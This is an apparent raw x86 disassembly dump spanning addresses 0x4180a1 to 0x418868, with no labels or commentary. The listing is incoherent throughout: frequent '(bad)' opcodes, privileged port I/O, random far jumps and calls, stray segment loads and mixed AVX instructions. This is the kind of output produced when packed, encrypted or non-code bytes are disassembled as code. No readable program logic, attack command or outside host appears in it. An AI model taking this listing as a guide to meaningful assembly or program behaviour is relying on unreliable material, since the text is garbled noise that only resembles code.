  4180a1:	(bad)  
  4180a2:	pusha  
  4180a3:	dec    eax
  4180a4:	fstp   TBYTE PTR [eax-0x4df05b3b]
  4180aa:	push   esi
  4180ab:	xchg   DWORD PTR [edi],edx
  4180ad:	pusha  
  4180ae:	arpl   dx,cx
  4180b0:	je     0x418092
  4180b2:	xchg   DWORD PTR [esi],ebx
  4180b4:	fsubr  st(1),st
  4180b6:	dec    esi
  4180b7:	and    esp,esi
  4180b9:	xor    ecx,0xffffff84
  4180bc:	xor    bl,bh
  4180be:	xchg   ebp,eax
  4180bf:	neg    DWORD PTR [esi-0x6083efe1]
  4180c5:	nop    DWORD PTR [edx-0x34]
  4180c9:	push   ebp
  4180ca:	cmp    DWORD PTR [esi+ecx*8],edi
  4180cd:	repnz cs nop
  4180d0:	cmp    BYTE PTR [ebx-0xc4c791d],bl
  4180d6:	jno    0x41805f
  4180d8:	les    eax,FWORD PTR [ebp-0x3e]
  4180db:	inc    edx
  4180dc:	mov    ah,0xa2
  4180de:	outs   dx,BYTE PTR ds:[esi]
  4180df:	inc    ecx
  4180e0:	mov    bh,0x5
  4180e2:	push   0xfffffff7
  4180e4:	mov    edi,DWORD PTR [eax+0x3b6247fa]
  4180ea:	xchg   ebx,eax
  4180eb:	arpl   WORD PTR [ebp-0x6f],bx
  4180ee:	fwait
  4180ef:	push   es
  4180f0:	or     esp,DWORD PTR [ebx+0x4e]
  4180f3:	jae    0x41811d
  4180f5:	inc    ecx
  4180f6:	cli    
  4180f7:	fimul  WORD PTR fs:[edi-0x5c1b974d]
  4180fe:	xor    BYTE PTR [edx-0x6d],bh
  418101:	xchg   esp,eax
  418102:	sub    BYTE PTR [edx+0x68],dl
  418105:	adc    BYTE PTR [ebx],ch
  418107:	mov    fs,WORD PTR [ebx+ebp*2]
  41810a:	mov    cl,0xca
  41810c:	retf   
  41810d:	and    eax,0x70
  418110:	push   esp
  418111:	rol    ch,0x3c
  418114:	and    DWORD PTR [edx+0x76c74282],0x3d
  41811b:	pop    ss
  41811c:	fbld   TBYTE PTR [ebp-0x3666be83]
  418122:	iret   
  418123:	out    0xcb,al
  418125:	ja     0x4180bf
  418127:	pop    esi
  418128:	add    eax,0x174d129
  41812d:	sbb    DWORD PTR [ebx+0x57],eax
  418130:	stc    
  418131:	mov    eax,0xad8fd8ec
  418136:	leave  
  418137:	lods   eax,DWORD PTR ds:[esi]
  418138:	clc    
  418139:	clc    
  41813a:	push   0xaccb2534
  41813f:	scas   al,BYTE PTR es:[edi]
  418140:	out    0xcc,eax
  418142:	jp     0x418105
  418144:	lock jb 0x4181c6
  418147:	push   ebp
  418148:	adc    al,0x5
  41814a:	or     BYTE PTR [esi-0x22],0xf0
  41814e:	inc    ebx
  41814f:	lods   eax,DWORD PTR ds:[esi]
  418150:	pusha  
  418151:	push   ss
  418152:	icebp  
  418153:	pop    eax
  418154:	inc    ecx
  418155:	fdiv   QWORD PTR [eax]
  418157:	mov    ch,0x92
  418159:	fst    DWORD PTR ss:[esi+ebx*4]
  41815d:	imul   ebx,DWORD PTR [esi+0x726d1b98],0x2e
  418164:	retf   
  418165:	xchg   BYTE PTR [esi+ebp*1-0x47],bh
  418169:	jnp    0x418197
  41816b:	jle    0x418152
  41816d:	jns    0x4180f6
  41816f:	pop    edx
  418170:	xor    cl,bl
  418172:	sub    BYTE PTR [edi-0x694f462e],0xf1
  418179:	cdq    
  41817a:	frstor [esi+0x75]
  41817d:	inc    edx
  41817e:	add    BYTE PTR [ecx+0x3168fc59],bl
  418184:	push   cs
  418185:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418186:	ins    BYTE PTR es:[edi],dx
  418187:	mov    cs,WORD PTR [ecx+0x64]
  41818a:	mov    cl,0x44
  41818c:	jp     0x418172
  41818e:	jecxz  0x418159
  418190:	jle    0x41814e
  418192:	inc    ecx
  418193:	mov    ch,0xe9
  418195:	dec    edi
  418196:	in     eax,0xbb
  418198:	ins    BYTE PTR es:[edi],dx
  418199:	enter  0xe0b0,0x99
  41819d:	inc    edi
  41819e:	std    
  41819f:	add    al,dl
  4181a1:	xor    BYTE PTR [ebx],ch
  4181a3:	mov    bh,0xd0
  4181a5:	pop    edi
  4181a6:	inc    ebx
  4181a7:	mov    eax,0x66906b35
  4181ac:	retf   0x510e
  4181af:	fcom   QWORD PTR [ebx+0x4b42a552]
  4181b5:	mov    bl,0xf2
  4181b7:	popa   
  4181b8:	dec    ebp
  4181b9:	push   cs
  4181ba:	js     0x4181c8
  4181bc:	cmp    eax,0xde031f2d
  4181c1:	pop    ebx
  4181c2:	sub    eax,0x48bb76e4
  4181c7:	mov    cl,0xc9
  4181c9:	pop    ebx
  4181ca:	cdq    
  4181cb:	or     BYTE PTR [ebp+esi*1-0x67987277],dh
  4181d2:	and    edx,ebx
  4181d4:	push   esp
  4181d5:	sub    al,0xd1
  4181d7:	cmp    al,0xae
  4181d9:	cmp    al,0x95
  4181db:	(bad)  
  4181dc:	pop    esi
  4181dd:	adc    al,0x9a
  4181df:	fisubr WORD PTR [esi+0x1b122f8a]
  4181e5:	xchg   ecx,eax
  4181e6:	aad    0x1b
  4181e8:	sub    bh,al
  4181ea:	add    esi,0x39
  4181ed:	loop   0x418219
  4181ef:	jbe    0x418231
  4181f1:	cmc    
  4181f2:	out    0x3f,al
  4181f4:	data16 hlt 
  4181f6:	mov    bh,0x49
  4181f8:	test   BYTE PTR [eax+0x5],ch
  4181fb:	adc    al,cl
  4181fd:	xchg   ecx,eax
  4181fe:	not    BYTE PTR [edi]
  418200:	(bad)  
  418201:	out    dx,al
  418202:	adc    ebx,DWORD PTR [ecx-0x59]
  418205:	xchg   edx,eax
  418206:	sub    al,0x19
  418208:	sar    DWORD PTR [edx+0x35],0x96
  41820c:	and    al,0x9b
  41820e:	jecxz  0x4181dc
  418210:	(bad)  [ebp+eiz*4-0x5bc4a0dd]
  418217:	mov    bl,0x38
  418219:	or     al,0x66
  41821b:	mul    BYTE PTR [ebp-0x2e]
  41821e:	fist   DWORD PTR ds:0xbdb07f67
  418224:	test   al,0xa1
  418226:	xor    BYTE PTR [ebx+0x5ccef08c],cl
  41822c:	fimul  DWORD PTR [ebx-0x339a7531]
  418232:	adc    cl,BYTE PTR [ebp-0x3a]
  418235:	loope  0x4182ab
  418237:	add    al,0x5b
  418239:	push   ebx
  41823a:	in     al,0xc9
  41823c:	popf   
  41823d:	adc    dl,0xbc
  418240:	dec    eax
  418241:	adc    eax,0x325084e4
  418246:	fs jmp 0x418238
  418249:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41824a:	shl    dl,1
  41824c:	mov    cl,0xa9
  41824e:	inc    edx
  41824f:	fstp   TBYTE PTR ds:0x7df1c0e6
  418255:	daa    
  418256:	jne    0x418268
  418258:	cmp    al,0xab
  41825a:	fcomp  QWORD PTR [eax]
  41825c:	inc    BYTE PTR [ebx+0x53]
  41825f:	inc    eax
  418260:	jmp    0xce0a:0x2ca63273
  418267:	ins    BYTE PTR es:[edi],dx
  418268:	ror    DWORD PTR [edx-0x7e],0xe7
  41826c:	pop    esi
  41826d:	push   ebx
  41826e:	ret    0x2df2
  418271:	xor    eax,0xf31b1c9f
  418276:	inc    ecx
  418277:	aam    0x3a
  418279:	or     eax,DWORD PTR [esi-0x2d1cbbb4]
  41827f:	jns    0x41820c
  418281:	lods   eax,DWORD PTR ds:[esi]
  418282:	sbb    al,0x4a
  418284:	xchg   ebx,eax
  418285:	jae    0x418212
  418287:	fstp   st(7)
  418289:	or     al,0xeb
  41828b:	xchg   edi,eax
  41828c:	push   ecx
  41828d:	add    eax,0x3267ed7e
  418292:	push   ss
  418293:	mov    bl,0xaf
  418295:	cmp    al,0x61
  418297:	push   esp
  418298:	ins    DWORD PTR es:[edi],dx
  418299:	je     0x418266
  41829b:	adc    esp,ebp
  41829d:	add    al,0xc9
  41829f:	div    BYTE PTR [esi+ebp*1+0x1]
  4182a3:	mov    edx,0xe4e381f4
  4182a8:	test   bh,0x4f
  4182ab:	mov    ch,0x38
  4182ad:	stc    
  4182ae:	(bad)  
  4182af:	xor    edx,esi
  4182b1:	aad    0x16
  4182b3:	push   0xd3fcb909
  4182b8:	dec    ebx
  4182b9:	sub    dl,BYTE PTR [eax-0x9d6328f]
  4182bf:	fld    st(5)
  4182c1:	mov    eax,ds:0x5ea4e07b
  4182c6:	or     al,0x90
  4182c8:	loope  0x418267
  4182ca:	inc    esi
  4182cb:	jo     0x418338
  4182cd:	cmp    DWORD PTR [ecx+ecx*2-0x4e],esp
  4182d1:	jle    0x41827d
  4182d3:	aaa    
  4182d4:	popa   
  4182d5:	leave  
  4182d6:	aam    0xd7
  4182d8:	push   es
  4182d9:	xchg   esp,eax
  4182da:	cli    
  4182db:	adc    al,0x8b
  4182dd:	add    al,0x7
  4182df:	into   
  4182e0:	das    
  4182e1:	cmp    esi,ecx
  4182e3:	fwait
  4182e4:	push   esi
  4182e5:	sub    dh,BYTE PTR [esi+0x16]
  4182e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4182e9:	arpl   ax,cx
  4182eb:	std    
  4182ec:	aam    0xe9
  4182ee:	mov    ch,0xf
  4182f0:	aam    0x7e
  4182f2:	sub    edi,DWORD PTR [ebx-0x6e5df049]
  4182f8:	push   ds
  4182f9:	loopne 0x418367
  4182fb:	pop    edx
  4182fc:	stc    
  4182fd:	fadd   DWORD PTR [edi-0x31d7f655]
  418303:	je     0x418340
  418305:	fst    DWORD PTR [esi-0x75]
  418308:	shr    BYTE PTR cs:[ecx+0x455e6484],cl
  41830f:	dec    esi
  418310:	fbld   TBYTE PTR [eax+esi*2]
  418313:	aam    0xb6
  418315:	leave  
  418316:	in     eax,0x6
  418318:	xor    eax,0xdefc8ec5
  41831d:	sti    
  41831e:	in     eax,0xcb
  418320:	or     esi,DWORD PTR [edi-0x3abffddf]
  418326:	aad    0x93
  418328:	jns    0x418303
  41832a:	daa    
  41832b:	xor    bh,al
  41832d:	je     0x4183aa
  41832f:	lods   eax,DWORD PTR ds:[esi]
  418330:	or     eax,0x8e11e52
  418335:	lds    ecx,FWORD PTR [edi]
  418337:	mov    esp,0xeb6665a1
  41833c:	xchg   BYTE PTR [edx+0x660f11b],dh
  418342:	jmp    0x8b5683ca
  418347:	mov    bl,0xf8
  418349:	aam    0xa2
  41834b:	push   edi
  41834c:	dec    eax
  41834d:	push   0x7394856c
  418352:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418353:	mov    ah,0xf4
  418355:	ror    DWORD PTR [ebx-0x12],1
  418358:	cli    
  418359:	dec    eax
  41835a:	lods   eax,DWORD PTR ds:[esi]
  41835b:	mov    fs,WORD PTR [ebx+ecx*8-0x52732d47]
  418362:	vaddsubpd ymm6,ymm4,YMMWORD PTR [eax-0x19]
  418367:	or     eax,0x45e3be5
  41836c:	xor    dl,dl
  41836e:	pop    ds
  41836f:	mov    bh,0x23
  418371:	adc    al,0xd6
  418373:	pop    esi
  418374:	push   eax
  418375:	retf   0x1ebe
  418378:	outs   dx,BYTE PTR ds:[esi]
  418379:	ffree  st(6)
  41837b:	call   0xd14a:0x739d30dc
  418382:	dec    edx
  418383:	push   esp
  418384:	and    eax,0xd4b1293a
  418389:	mov    WORD PTR [ebx+0x6f],ss
  41838c:	cmp    al,0x4
  41838e:	jp     0x4183d3
  418390:	mov    ah,0x9c
  418392:	mov    edi,0x4ed15ba
  418397:	sbb    eax,0x4cd3fd66
  41839c:	nop
  41839d:	xchg   esi,eax
  41839e:	call   0x4ba90bf1
  4183a3:	inc    edx
  4183a4:	adc    BYTE PTR [eax-0x139e2705],ch
  4183aa:	sbb    ecx,0xffffffea
  4183ad:	retf   
  4183ae:	cld    
  4183af:	(bad)  
  4183b0:	ins    DWORD PTR es:[edi],dx
  4183b1:	push   eax
  4183b2:	inc    edi
  4183b3:	mov    ebp,0x5950017e
  4183b8:	bswap  ecx
  4183ba:	rcl    al,cl
  4183bc:	cwde   
  4183bd:	jns    0x41841a
  4183bf:	mov    esp,0x2d992415
  4183c4:	ins    BYTE PTR es:[edi],dx
  4183c5:	push   cs
  4183c6:	ins    BYTE PTR es:[edi],dx
  4183c7:	jns    0x418365
  4183c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4183ca:	jo     0x4183a9
  4183cc:	add    BYTE PTR [eax+0xc9c5afb],bh
  4183d2:	inc    edi
  4183d3:	int3   
  4183d4:	jno    0x41836f
  4183d6:	in     al,0xd1
  4183d8:	sbb    eax,0xbe25ab68
  4183dd:	jo     0x41838f
  4183df:	mov    edi,0xaab778ac
  4183e4:	jbe    0x41839b
  4183e6:	popf   
  4183e7:	inc    edx
  4183e8:	xchg   BYTE PTR ds:0x5d7eb0d5,dl
  4183ee:	mov    ds:0x25ecf990,eax
  4183f3:	out    0x87,eax
  4183f5:	icebp  
  4183f6:	or     edx,ecx
  4183f8:	retf   0x2f65
  4183fb:	bound  ecx,QWORD PTR [edx]
  4183fd:	xchg   BYTE PTR [edi],ch
  4183ff:	adc    esi,DWORD PTR [ebx+0x51]
  418402:	jmp    0xf02191f1
  418407:	xor    esi,ecx
  418409:	sub    dl,BYTE PTR [esi+0x42601d87]
  41840f:	mov    ah,0x6e
  418411:	xor    BYTE PTR [ebx-0x43],dh
  418414:	fs adc DWORD PTR cs:[esp+ebx*8],ebx
  418419:	ss pop ebx
  41841b:	jle    0x418487
  41841d:	lock test al,0xb2
  418420:	dec    ebx
  418421:	inc    esi
  418422:	stc    
  418423:	inc    ebp
  418424:	add    al,0x84
  418426:	jmp    0x5beb523c
  41842b:	xchg   esp,eax
  41842c:	push   ebx
  41842d:	pop    ss
  41842e:	ret    
  41842f:	mov    ebx,0x1a260caf
  418434:	pusha  
  418435:	pop    esi
  418436:	shr    BYTE PTR [edx+0x34],0x83
  41843a:	and    eax,0xf3f84679
  41843f:	hlt    
  418440:	or     BYTE PTR [esi-0x32],bh
  418443:	mov    WORD PTR [esi+ebp*2-0x63],ds
  418447:	popf   
  418448:	test   DWORD PTR [edx+0x61],ecx
  41844b:	in     al,dx
  41844c:	push   cs
  41844d:	adc    al,0x49
  41844f:	out    dx,eax
  418450:	cmp    eax,edi
  418452:	in     al,dx
  418453:	dec    esp
  418454:	stos   DWORD PTR es:[edi],eax
  418455:	jnp    0x41846d
  418457:	(bad)  
  418458:	test   eax,0xfbbf6af0
  41845d:	into   
  41845e:	push   0xb53d194d
  418463:	(bad)  
  418465:	cmp    al,0x87
  418467:	inc    ebx
  418468:	sahf   
  418469:	lods   al,BYTE PTR ds:[esi]
  41846a:	dec    ebx
  41846b:	pop    edx
  41846c:	les    ebx,FWORD PTR [esi]
  41846e:	xor    ecx,DWORD PTR [edx-0x24]
  418471:	jbe    0x418452
  418473:	push   ebp
  418474:	push   ds
  418475:	sub    dl,BYTE PTR [eax]
  418477:	adc    DWORD PTR [ebx-0xc67f135],edx
  41847d:	pusha  
  41847e:	add    DWORD PTR [ecx-0x2],edx
  418481:	je     0x418445
  418483:	in     al,dx
  418484:	fbstp  TBYTE PTR [eax]
  418486:	sbb    dl,BYTE PTR [ecx]
  418488:	retf   0xfd50
  41848b:	ins    BYTE PTR es:[edi],dx
  41848c:	int    0xae
  41848e:	mov    ebx,0xd31793e
  418493:	pop    esp
  418494:	mov    esp,0x87dc4f9f
  418499:	shr    DWORD PTR [ebx+eax*4-0x19],1
  41849d:	sar    dl,1
  41849f:	ja     0x418453
  4184a1:	sar    edx,cl
  4184a3:	fisubr DWORD PTR [edx+edx*4]
  4184a6:	out    dx,eax
  4184a7:	inc    edi
  4184a8:	cld    
  4184a9:	inc    edi
  4184aa:	es sub eax,0x427d0dd2
  4184b0:	call   0x6353f19d
  4184b5:	ret    0x71ca
  4184b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184b9:	mov    bh,0x76
  4184bb:	pop    ebp
  4184bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4184bd:	dec    eax
  4184be:	cmp    eax,0x33bdc169
  4184c3:	or     ah,BYTE PTR [ebx-0x67]
  4184c6:	lds    edi,FWORD PTR es:[edi]
  4184c9:	xchg   edi,eax
  4184ca:	call   0xa0f6b9f2
  4184cf:	xor    BYTE PTR ds:0xe768fbd8,dl
  4184d5:	(bad)  
  4184d6:	mov    eax,ds:0x1c96e3d
  4184db:	inc    edi
  4184dc:	fild   QWORD PTR ds:0x462622bb
  4184e2:	cmp    edi,edx
  4184e4:	(bad)  
  4184e5:	jmp    0x4184d1
  4184e7:	in     eax,0x4
  4184e9:	sub    DWORD PTR [esi-0x31],ebp
  4184ec:	lods   al,BYTE PTR ds:[esi]
  4184ed:	je     0x418519
  4184ef:	inc    esp
  4184f0:	pop    edi
  4184f1:	jns    0x418533
  4184f3:	push   edi
  4184f4:	test   al,0x5c
  4184f6:	add    eax,0xf1669ed1
  4184fb:	xchg   ebp,eax
  4184fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184fd:	(bad)  
  4184fe:	(bad)  
  4184ff:	and    BYTE PTR [bp+di-0x41],0x3a
  418504:	test   BYTE PTR [edi],al
  418506:	(bad)  
  418508:	aas    
  418509:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41850a:	cs sub edx,edx
  41850d:	(bad)  
  41850e:	ins    DWORD PTR es:[edi],dx
  41850f:	sar    BYTE PTR [esi+esi*1-0x56b70af9],cl
  418516:	gs test eax,0xf7a43f06
  41851c:	xchg   edi,eax
  41851d:	sahf   
  41851e:	push   0xab7d116e
  418523:	call   0xfb58:0x23f96105
  41852a:	pop    es
  41852b:	mov    dl,0xa
  41852e:	xlat   BYTE PTR ds:[ebx]
  41852f:	outs   dx,DWORD PTR ds:[esi]
  418530:	pop    edx
  418531:	xchg   edi,eax
  418532:	or     DWORD PTR [ebx+edi*8-0x1e3abdc9],edx
  418539:	jb     0x4184de
  41853b:	sar    DWORD PTR [esi],cl
  41853d:	mov    DWORD PTR [eax*2+0x6907340c],ebx
  418544:	sbb    al,0xd
  418546:	pop    ebx
  418547:	push   edi
  418548:	mov    al,ds:0x5f356f7e
  41854d:	div    edi
  41854f:	aas    
  418550:	push   0xffffffa5
  418552:	cmc    
  418553:	inc    edx
  418554:	aaa    
  418555:	lock inc ebx
  418557:	or     eax,0x352d324a
  41855c:	into   
  41855d:	push   esi
  41855e:	out    0xf3,eax
  418560:	lods   al,BYTE PTR ds:[esi]
  418561:	mov    dh,0x7e
  418563:	dec    ecx
  418564:	xchg   ebp,eax
  418565:	sbb    BYTE PTR [esi+0x500772a1],dl
  41856b:	xor    ecx,DWORD PTR [esi+0x5a59fa4f]
  418571:	sub    eax,0x2793b43e
  418576:	into   
  418577:	cmp    BYTE PTR [esi+eiz*2],0xb
  41857b:	ja     0x418583
  41857d:	div    DWORD PTR [esi-0x3d]
  418580:	sub    BYTE PTR [eax-0xe8d78fd],ch
  418586:	pop    esp
  418587:	sbb    eax,0xfe4a386f
  41858c:	lods   eax,DWORD PTR ds:[esi]
  41858d:	inc    edx
  41858e:	adc    DWORD PTR [ebp+0x31],eax
  418591:	in     al,dx
  418592:	and    DWORD PTR [edx-0x42],edx
  418595:	mov    WORD PTR [edx+0xf],ss
  418598:	loopne 0x4185af
  41859a:	add    eax,0x6cab1384
  41859f:	inc    edx
  4185a0:	and    ebx,DWORD PTR [eax-0x2eb95aa0]
  4185a6:	mov    BYTE PTR [edx+0x78337300],bl
  4185ac:	xchg   ebp,eax
  4185ad:	or     cl,BYTE PTR [edx-0x50bbbc44]
  4185b3:	sbb    BYTE PTR [eax+0x16],ah
  4185b6:	imul   ecx,DWORD PTR [esi-0x5fd6fecd],0xb076ad87
  4185c0:	ds inc ecx
  4185c2:	gs xchg esi,eax
  4185c4:	and    DWORD PTR [edi+0x58ab7db2],edi
  4185ca:	xchg   DWORD PTR [esi+0x3],esp
  4185cd:	push   ebp
  4185ce:	add    edx,DWORD PTR [edx+0x1407782f]
  4185d4:	bound  ebx,QWORD PTR [esi-0x42a08c97]
  4185da:	fld    TBYTE PTR [edx+0x31a28a7f]
  4185e0:	fcmovnbe st,st(4)
  4185e2:	(bad)  
  4185e3:	jne    0x418570
  4185e5:	out    0x12,al
  4185e7:	test   BYTE PTR [ebx-0x42ee7cb1],0xa9
  4185ee:	ret    0x8872
  4185f1:	xor    dl,BYTE PTR [eax+0xd]
  4185f4:	dec    esp
  4185f5:	int    0x9c
  4185f7:	dec    edx
  4185f8:	mov    al,ds:0x7cdc6bf3
  4185fd:	inc    edx
  4185fe:	dec    ecx
  4185ff:	ins    DWORD PTR es:[edi],dx
  418600:	jns    0x41859e
  418602:	jne    0x41865f
  418604:	sti    
  418605:	lock out dx,al
  418607:	adc    DWORD PTR [ebp-0x53],ebx
  41860a:	cmp    al,0x9f
  41860c:	mov    al,BYTE PTR [edi]
  41860e:	pop    ebx
  41860f:	push   ss
  418610:	mov    ecx,0xc7e33a75
  418615:	sti    
  418616:	imul   ecx,DWORD PTR [ebp+esi*4+0x6f],0x8940d119
  41861e:	jae    0x418669
  418620:	jno    0x41869b
  418622:	and    al,0x5b
  418624:	sub    eax,0xcaac666a
  418629:	test   al,0x1a
  41862b:	mov    edx,0x47b5a13f
  418630:	push   edi
  418631:	out    0xbc,al
  418633:	dec    ecx
  418634:	bound  ebp,QWORD PTR [ecx+0x54]
  418637:	pop    eax
  418638:	mov    ds:0x2da713a2,al
  41863d:	or     esp,DWORD PTR [ebp+0x11]
  418640:	xchg   ecx,eax
  418641:	dec    ebx
  418642:	das    
  418643:	stos   BYTE PTR es:[edi],al
  418644:	ja     0x4185f9
  418646:	or     DWORD PTR [eax],edx
  418648:	sbb    DWORD PTR [ebp-0x20],edi
  41864b:	call   0x6aa1:0xf32a6ffa
  418652:	pushf  
  418653:	int    0x90
  418655:	inc    eax
  418656:	vpandn xmm3,xmm1,XMMWORD PTR [edx-0x5831f0a5]
  41865e:	sti    
  41865f:	xchg   esp,eax
  418660:	xchg   esi,eax
  418661:	mov    ebp,0x440030b1
  418666:	sub    eax,0x14efcedb
  41866b:	or     bl,ah
  41866d:	daa    
  41866e:	dec    esp
  41866f:	gs or  esi,0x41361fcb
  418676:	and    eax,0x7b1a6d2d
  41867b:	aad    0xe9
  41867d:	sbb    BYTE PTR ds:0x77e26577,dl
  418683:	stos   BYTE PTR es:[edi],al
  418684:	cld    
  418685:	sbb    eax,0x3148f1ba
  41868a:	(bad)  
  41868c:	loope  0x418628
  41868e:	sub    edx,edx
  418690:	mov    al,ds:0x6460cb60
  418695:	(bad)  
  418696:	mov    WORD PTR [edi-0x18],?
  418699:	jle    0x41861e
  41869b:	in     eax,0x0
  41869d:	dec    ecx
  41869e:	mov    ah,0x0
  4186a0:	mov    edx,0xd214d75e
  4186a5:	in     al,0x40
  4186a7:	(bad)  
  4186a8:	sbb    dh,BYTE PTR [ecx]
  4186aa:	xchg   esp,eax
  4186ab:	aam    0x33
  4186ad:	loop   0x4186b0
  4186af:	daa    
  4186b0:	repz mov ebp,0xf7b9bef6
  4186b6:	mov    edi,0x35f0d3ad
  4186bb:	dec    edi
  4186bc:	pop    ss
  4186bd:	rcr    ecx,1
  4186bf:	mov    ds:0x36dab0c2,eax
  4186c4:	adc    DWORD PTR [ebp+0x7c135e14],0x2ca3f965
  4186ce:	dec    eax
  4186cf:	test   eax,0xe81390a5
  4186d4:	sti    
  4186d5:	lahf   
  4186d6:	in     eax,0xfa
  4186d8:	dec    edx
  4186d9:	xchg   ecx,eax
  4186da:	add    BYTE PTR ss:0xfc40176b,0xfd
  4186e2:	leave  
  4186e3:	xchg   ebp,eax
  4186e4:	push   edi
  4186e5:	lods   al,BYTE PTR ds:[esi]
  4186e6:	pop    edi
  4186e7:	bound  ecx,QWORD PTR [ebp-0x4]
  4186ea:	push   ebp
  4186eb:	mov    esp,0x7c068701
  4186f0:	pushf  
  4186f1:	(bad)  
  4186f2:	dec    ebx
  4186f3:	adc    DWORD PTR [ebp+eax*2+0xa53b76c],edx
  4186fa:	sub    al,0x33
  4186fc:	into   
  4186fd:	pop    edi
  4186fe:	mov    ch,0x6b
  418700:	jae    0x4186c2
  418702:	jno    0x4186d1
  418704:	inc    esi
  418705:	jne    0x4186dc
  418707:	mov    ah,0xff
  418709:	mov    BYTE PTR ds:0xde71f458,cl
  41870f:	sub    eax,0xd64a8fe2
  418714:	(bad)  
  418715:	lods   al,BYTE PTR ds:[esi]
  418716:	push   es
  418717:	stos   BYTE PTR es:[edi],al
  418718:	pop    esi
  418719:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41871a:	int3   
  41871b:	cmpxchg ebx,ebp
  41871e:	ficom  DWORD PTR [eax]
  418720:	rcr    BYTE PTR ds:0x97bcd684,0x8d
  418727:	adc    al,0x39
  418729:	pop    ebx
  41872a:	inc    esi
  41872b:	mov    al,0xc3
  41872d:	mov    eax,ds:0xd0650526
  418732:	hlt    
  418733:	mov    ebp,0xb5f4b88c
  418738:	cmp    al,0x43
  41873a:	imul   edx,DWORD PTR [ecx],0xffffffd5
  41873d:	xchg   edx,eax
  41873e:	pusha  
  41873f:	fmul   st,st(7)
  418741:	loop   0x41879a
  418743:	xor    al,0x8c
  418745:	retf   
  418746:	int    0xa1
  418748:	xchg   DWORD PTR [ecx],edi
  41874a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41874b:	inc    edi
  41874c:	mov    WORD PTR [esi],?
  41874e:	lock mov dl,0x5d
  418751:	push   edi
  418752:	xchg   esi,eax
  418753:	daa    
  418754:	imul   edx,DWORD PTR [ebx+0x77],0x58
  418758:	sub    eax,0x6ca90f05
  41875d:	std    
  41875e:	pop    edi
  41875f:	mov    al,0x74
  418761:	cld    
  418762:	fcom   QWORD PTR [ebx+0x1d289d9c]
  418768:	mov    dl,0xe6
  41876a:	sar    DWORD PTR [esi],0x46
  41876d:	mov    dl,0xc4
  41876f:	test   eax,0xe4b4316c
  418774:	clc    
  418775:	mov    ebx,0x882032b4
  41877a:	xor    BYTE PTR [ecx-0x6c],dh
  41877d:	dec    edi
  41877e:	mov    ecx,0x95d6eecb
  418783:	jp     0x4187b3
  418785:	test   BYTE PTR [ecx+0x316b76c3],bh
  41878b:	into   
  41878c:	sub    bl,cl
  41878e:	shr    BYTE PTR [ecx-0x1],0xf6
  418792:	xchg   esp,eax
  418793:	push   ebx
  418794:	adc    esp,esp
  418796:	imul   esp,ebx,0xffffffeb
  418799:	sub    eax,0xe305867c
  41879e:	xchg   ebp,eax
  41879f:	inc    ecx
  4187a0:	dec    edx
  4187a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187a2:	ds sti 
  4187a4:	popf   
  4187a5:	jo     0x4187c6
  4187a7:	jmp    0x418798
  4187a9:	adc    eax,0x3ab3d2f2
  4187ae:	xor    eax,0xbc06e7ff
  4187b3:	sub    BYTE PTR [edx+0x5e],ah
  4187b6:	dec    esp
  4187b7:	cmp    DWORD PTR [ebp+0x2],0x2b
  4187bb:	push   ds
  4187bc:	sub    BYTE PTR [ecx],bl
  4187be:	xchg   edi,eax
  4187bf:	cmc    
  4187c0:	mov    ebx,0x48fd9e5d
  4187c5:	xor    al,0x8e
  4187c7:	push   0xffffffdc
  4187c9:	xchg   ebx,eax
  4187ca:	popa   
  4187cb:	sbb    ah,bl
  4187cd:	push   esi
  4187ce:	popf   
  4187cf:	sub    DWORD PTR [ecx],eax
  4187d1:	clc    
  4187d2:	push   esp
  4187d3:	out    dx,al
  4187d4:	dec    ebx
  4187d5:	sbb    BYTE PTR [ecx+0x73],ch
  4187d8:	mov    al,ds:0xab8aeced
  4187dd:	xor    al,0x42
  4187df:	lea    ebx,[edi+edi*1+0x6894515f]
  4187e6:	pop    ebx
  4187e7:	retf   0xca85
  4187ea:	shr    DWORD PTR [ebx+0x6e],0xfb
  4187ee:	cmc    
  4187ef:	mov    ch,0xd9
  4187f1:	xor    BYTE PTR [ebx],0x34
  4187f4:	add    ch,bl
  4187f6:	push   ss
  4187f7:	xchg   bh,ah
  4187f9:	(bad)  
  4187fa:	push   edi
  4187fb:	jmp    0x4187f6
  4187fd:	lods   eax,DWORD PTR ds:[esi]
  4187fe:	push   edi
  4187ff:	cs jo  0x418850
  418802:	xchg   edi,eax
  418803:	jno    0x41881f
  418805:	mov    eax,0xc8b13650
  41880a:	jbe    0x418833
  41880c:	xor    esp,DWORD PTR [eax-0x27]
  41880f:	(bad)  [edi]
  418811:	dec    eax
  418812:	(bad)  
  418813:	ins    DWORD PTR es:[edi],dx
  418814:	xor    al,0x89
  418816:	sub    eax,0x144a4c92
  41881b:	into   
  41881c:	fbld   TBYTE PTR [eax]
  41881e:	retf   0x2043
  418821:	xchg   ecx,eax
  418822:	loopne 0x41881f
  418824:	mov    gs,WORD PTR [ebp+0x23]
  418827:	add    eax,0x8c08a6a3
  41882c:	xor    al,0x2a
  41882e:	inc    esi
  41882f:	(bad)  
  418830:	in     al,0xc4
  418832:	je     0x4187b5
  418834:	and    edx,edx
  418836:	or     BYTE PTR [ebx+esi*1],bl
  418839:	outs   dx,DWORD PTR ds:[esi]
  41883a:	add    dl,dl
  41883c:	(bad)  [edx]
  41883e:	ss sti 
  418840:	fistp  QWORD PTR [eax-0x1]
  418843:	or     esi,DWORD PTR [esp+ecx*8+0x51]
  418847:	mov    cl,0x1d
  418849:	push   0x93ec23e5
  41884e:	mov    edi,0x562dabe0
  418853:	xor    eax,0xce8cf78e
  418858:	stc    
  418859:	leave  
  41885a:	(bad)  
  41885b:	sbb    DWORD PTR [ebp-0x544b185e],ecx
  418861:	dec    eax
  418862:	mov    edi,0x72f9ae2a
  418867:	in     al,dx
  418868:	dec    esi
